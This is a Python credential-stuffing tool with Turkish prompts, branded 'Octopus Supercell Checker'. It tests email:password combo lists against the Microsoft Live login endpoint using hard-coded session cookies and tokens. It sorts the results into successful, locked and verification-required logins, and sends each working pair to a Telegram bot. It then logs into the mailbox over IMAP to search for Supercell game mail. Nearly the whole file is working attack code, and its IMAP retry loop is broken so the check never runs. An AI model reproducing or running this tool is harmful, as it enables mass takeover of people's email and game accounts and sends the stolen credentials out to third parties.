import subprocess, sys, os, webbrowser, pyfiglet

k="<"*12;e=">"*12;banr=pyfiglet.figlet_format(" OCTUPUS SUPERCELL CHECKER");print(f"\033[1;36m{banr}\n\n\033[1;35mTELEGRAM: @octopsprime @dezzevip\n\n")

import requests
from termcolor import colored
import imaplib
import email
from email.header import decode_header
import time
import sys

telegram_token = input("TOKEN GİR KNK : ")
chat_id = input("ID GİR BRO : ")

def send_telegram_message(message):
    try:
        url = f'https://api.telegram.org/bot{telegram_token}/sendMessage'
        params = {'chat_id': chat_id, 'text': message}
        requests.get(url, params=params)
    except Exception as e:
        print(f"Telegram mesajı gönderilirken hata oluştu: {e}")

def kontrol_et(username, password):
    try:
        mail = imaplib.IMAP4_SSL("outlook.office365.com")
        mail.login(username, password)
        mail.select("inbox")
        return mail
    except imaplib.IMAP4.error:
        return None

def mesaj_kontrol_et(mail, anahtar_kelime):
    try:
        sonuc, veri = mail.search(None, f'(BODY "{anahtar_kelime}")')
        if sonuc == "OK":
            email_ids = veri[0].split()
            if len(email_ids) > 0:
                #Suclubey
                en_son_email_id = email_ids[-1]
                sonuc, veri = mail.fetch(en_son_email_id, "(RFC822)")
                for response_part in veri:
                    if isinstance(response_part, tuple):
                        mesaj = email.message_from_bytes(response_part[1])
                        kimden, encoding = decode_header(mesaj.get("From"))[0]
                        if isinstance(kimden, bytes):
                            kimden = kimden.decode(encoding or "utf-8")
                        return True, kimden
        return False, None
    except Exception as e:
        print(f"Posta kutusunu ararken bir hata oluştu: {str(e).encode('utf-8', errors='ignore').decode('utf-8')}")
        return False, None

anahtar_kelime_listesi = ["supercell", "supercell", "outlook", "hotmail"]

combo_yolu = input("COMBO YOLU KNK: ")

url = 'https://login.live.com/ppsecure/post.srf?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&contextid=A3B74F5B6C31EB65&opid=9B74E61243B89B99'
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=159&ct=1725370236&rver=7.5.2211.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26deeplink%3dowa%252f0%252f%253fstate%253d1%2526redirectTo%253daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8%26RpsCsrfState%3d576001eb-c191-d69e-3842-e6bb419dbca9&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'Cookie': 'MSCC=70.169.21.188-TR; MicrosoftApplicationsTelemetryDeviceId=fa28da85-4497-410f-abca-10b65a111ad4; MUID=7c9c16de6b5a464bb7011d3d10650902; MSFPC=GUID=532b44667fb849a28eaccd6882af8174&HASH=532b&LV=202409&V=4&LU=1725350267217; mkt=tr-TR; IgnoreCAW=1; SDIDC=CpSFgaSyY04wL1pLPO9P3dERtgljeX051JBfEqzVnIPCkB*9bjIVFhHiyZ\u0021sQBNMzvPSLB0FX\u0021JXNAuILWOSS\u0021aOgFsA6PEyRJDV6aURknaJRPj\u00214Z0biSLQkaEaiPbSf3lFJ74RqxiCrzk5jmSwDMU$; MSPBack=0; logonLatency=LGN01=638609670362279647; uaid=aa114a1f107349c49d155a30362b27c1; MSPRequ=id=292841&lt=1725370236&co=0; OParams=11O.DmLU8ruNJIsEOS6BeQQ5ZGftb7Oa5or2nAIpRuF3Z0Q1hakZSWgn4R*hY9w8wNCZdJl1Pc*jcSAjk8MSYArZwDDjArpPF3lLmhvVmBvwIHkgMzsL5KCVVNvdtczYGco5Nw4LSd2GyvvkBOfS42j\u0021Ps6H4KN7Cr7Vql\u0021MXDgkBcoq4AlEq2bHabtT*iMHGrgpEHaoXPMG\u0021HEBd2*TtZ5XxcO0nNxGPYpi\u0021snxNb46sOHMRE69Ins4JCwGYfOwLdAS6rscWdMlYxM3pT5uIx*qUIlamKMq4NJLyydPM2kQtgq9UDl6UutVDwORD0zJbZOaVeGISTuIWHkXQ4Si7gR4Rk11SGptPNw\u0021t1wUYhNOCypeS94MPPgcJYUIGQVBmjfWrTshHvjgG3X5HvI01vUrar*hIyYOdBZEnQwxrSk9UJT3hdNKNesYxtTMcs6\u0021dTjZ5kAR*tq1ZMmQmPgJYK4NmnE55AkIN*XOpMi3lDumMyOpN72D3e9kXKtMqFNNN8plz2NDyT5bGsZmrbbNduFvbC1cSwF5VhSaHNqeqBgvTQ8\u0021pRWH*9ju6vI71jJH5kxkRXgWYUlYgheu0jEg9Win9*j3IIuEp3\u0021wtxuFmkX\u0021oMPfLbIeJBs*dbzkzpuHlOORdzsdiPQEXyVhbQ\u0021jewcjY9Z7bORS972dbdGWcwB0OaU74P*3wqEgZzzzzAAh4P1Ph1w2f*L6ywZti7L2ZCTQaADLk1pjl2pafSdmfWcid4tTTJJeNvLRYW9jVN9kMzlmo0i9pxJk3YaKuwVXSF7qZhdhMRutxGmM8V9s\u0021wq37N\u0021Go052L3os6ddkSh3oIOkDLFZrlf0PNYDOEiuePX6NuoDNSNeKq3jC45sOlCeZ4yKVYViKQz0qiJ0Qcss790MdEkMjEAWD2HOhv23D4uNcKpjeHn68FyqCInOIyjuWEsure*SR2S5wauqg92KGDqeK6jWHYf6w*in8ZyxeAIziFpTD44SnEJm6eJ3Kh\u0021qfZW*2UHX30YDBxIhB2\u00217eBkNDKGMIQXv46\u0021*8iZJawjyP0x2ORE3lQi8djuJvbIMUSjLrwmtOGOSe*Es0YyzQYVVF7HsJ29Hp\u0021D\u0021Bh0SqQiYaZW*kMv2fgjIi0NPhO8HZ5aEU2Qb*CleDJ1kmnAXvbqHIx7JM5TRxLVE7ogL5ls54iP6*w1cGrfmHqdzurBBcsY*X3FnL2YUzoUK8XhoZ8m44*hemxmpm5biWO9miMxM9uSQukOAUggeABLsHn2G8r7ecs3vwUTJCV6V6c77VTvFYnXCjTzEnxQ*RcFPEbhA0DRv2YLoIOWL5MIx4xKji1TQDUvhRftIypN4d6A08Z588mSty3L4BB1nrExSe\u0021yRdWej9ndgBknteu*uKTK*PnqMq8pTNw6pJ9wceABbvsZfejQByfSuO*0tdfPBc2J\u0021U02Kw\u0021MT7lOeEjhIR85SknLWgAXQ3hTHlzYVrrMxg3j5A47jCYwn\u0021XAp0jJr*Z6M*ovzTgEwtQFCSXKLQRQOv\u0021GQysPxpWc9OPFg3PGWnq1kitEUtnSJImygzTcCO2dJUxBJK0QK8cWsHbWUc4m0n98qrhkX0qHsFxcP2hpfSOr3Ott*y7RPE1oFeZo8HXX7Jd5D5Em8FcIFbLqjasL96Fx7No29L5HeKMH*JNfWQTfTS\u0021Bo3pD*PKY5zqtn\u0021Ys\u00219EANgncBgVA1Cb6a3r9ClALllOIiq1HQe5fY5LC6FL2wJYj\u0021AEZqD\u0021y\u0021LTXE7wOxqWY2lv7UqlMLWi7HlGGAwyAUJgcju9xOJXbI9h\u0021zNtHqlFY0pQ28uyEv6ni2QFQCpzVLGkRuREjA\u0021tN4eaVH\u0021n3kjM5kpiky0vEpUhuyCYoPfriylFu2mb64gcPM4NCW*QJDMZGjIEh7TfjjouBrD3frrsF5PvyiVxlzu97h5bKEZFn\u00217FaKdjmeO*UWQxuZP3mLiu0A9wyaAqbM*DIcoqC\u0021gIPRLDxOqA2b6g4GT1Kwa9CWQMf8myv9TPZ2aMGCeRp\u0021gUVoHLfKbUcJham0q8JTwHazyrR01R7U1IzGwp1OhhOIhuu5Z3fzuWl6qMmycd9ZR0HKMA*e6PGp1i5DnqO9j; ai_session=hYyRztjeNXxYExnTNXK310|1725370236750|1725370236750; fptctx2=taBcrIH61PuCVH7eNCyH0F58uBDuZFZOunQHZt3FugkSrt0l35N0sichWsCFV2h7ygYPn7%252bpWg00jZL3RxvonGUN%252bx4B1d68nItRzFYoBdOI2acsgoJCYjB8oteoXjArKFHoik8zTh8fqaBeuJJHFqHRfY4M4uztRa%252fiRvROF%252b4HlQjKSxySm7lMKom9w0kKvDQfpUNVhvwmmCVpQbBvNRN2051Rkr%252bvWDjr81q0QRJa7VEwlCCtfK3cGRy9%252fDjgUGiAnCEDeYl7YRKSB2%252bZ5xjKni0YvhgEfXw5k122RLbBGSxOQs4%252bdyqcWG%252fFXWgOehCfpb%252fvSVz7x02yTMmVgA%253d%253d; MSPOK=$uuid-2b6ee15a-42aa-459c-b752-3104a87a1f4b$uuid-f507906e-5790-4e5d-acc4-0bda4b6e47b8' 
}


with open(combo_yolu, 'r') as combo_file:
    for line in combo_file:
        try:
            
            mail, password = line.strip().split(':')
        except ValueError:
            print(colored("Geçersiz format", 'red'))
            continue
        
        
        data = {
            'ps': '2',
            'psRNGCDefaultType': '',
            'psRNGCEntropy': '',
            'psRNGCSLK': '',
            'canary': '',
            'ctx': '',
            'hpgrequestid': '',
            'PPFT': '-DtDdKIM3u50edHDCEYSuzCeIgSJTbmSTGgT7yUlFHv1slmgo2n!6hhCxwZC0bgbp!xoZgbBn4i5BAm6uj8wU3UoIMALN8QqFutPD6kDr2RFbLifk4RQHePtR0*vDK3JxLo1yVR*aFaMU1kSgA9fV3IPTQy7TZerYpMT4Mzj5nTCjXOovErVikoZoFUq4mRRdjNYsa*YEljVcsbmtrpviYqDHOMiUNtlR1XzE8!U8!X2GhYJsSN75rx025IxO0O62jg$$',
            'PPSX': 'Passport',
            'NewUser': '1',
            'FoundMSAs': '',
            'fspost': '0',
            'i21': '0',
            'CookieDisclosure': '0',
            'IsFidoSupported': '1',
            'isSignupPost': '0',
            'isRecoveryAttemptPost': '0',
            'i13': '0',
            'login': mail,
            'loginfmt': mail,
            'type': '11',
            'LoginOptions': '3',
            'lrt': '',
            'lrtPartition': '',
            'hisRegion': '',
            'hisScaleUnit': '',
            'passwd': password
        }
        
        
        response = requests.post(url, headers=headers, data=data)
        
        
        html_text = response.text

        if "sErrTxt:'Bu ada sahip bir Microsoft hesabı yok. Başka bir hesap girin ya da" in html_text:
            print(colored(f"{mail}:{password} - Mail adresi hatalı", 'red'))
            
        elif "sErrTxt:" in html_text:
            print(colored(f"{mail}:{password} - Başarısız giriş", 'red'))
            
        elif "Yanlış bir hesap adı ya da parolayla çok sayıda oturum açma girişimi yaptınız" in html_text:
            print(colored(f"{mail}:{password} - Banlı hesap", 'yellow'))
        
        elif '></noscript><title>Devam' in html_text:
            print(colored(f"{mail}:{password} - Doğrulama gerekli", 'yellow'))
        
        else:
            print(colored(f"{mail}:{password} - Başarılı giriş", 'green'))
            
            
            mesaj = (
              "OCTOPUS VİP SUPERCELL 𝑆𝑈𝑃𝐸𝑅𝐶𝐸𝐿𝐿 𝐻𝐼̇𝑇\n"
                
                f"{mail}\n"
                
                
                
                f"{password}\n"
               
                " 𝑩𝒀  @DEZZEVİP"
            )
            send_telegram_message(mesaj)
            
            
            
            
            deneme_sayisi = 6
            mail_hesabi = None

            while deneme_sayisi < 6 and mail_hesabi is None:
                mail_hesabi = kontrol_et(mail, password)
                if mail_hesabi is None:
                    deneme_sayisi += 6
                    time.sleep(0.0) 
            
            if mail_hesabi:
                for anahtar_kelime in anahtar_kelime_listesi:
                    mesaj_var_mi, kimden = mesaj_kontrol_et(mail_hesabi, anahtar_kelime)
                    if mesaj_var_mi:
                        basari_mesaji = f"{mail}:{password}:✅ {anahtar_kelime} (Gönderen: {kimden})\n"
                        print(basari_mesaji.strip())
                        send_telegram_message(basari_mesaji)
                if not any(mesaj_var_mi for mesaj_var_mi, _ in [mesaj_kontrol_et(mail_hesabi, anahtar_kelime) for anahtar_kelime in anahtar_kelime_listesi]):
                    print(colored("Anahtar kelime bulunamadı", 'yellow'))
                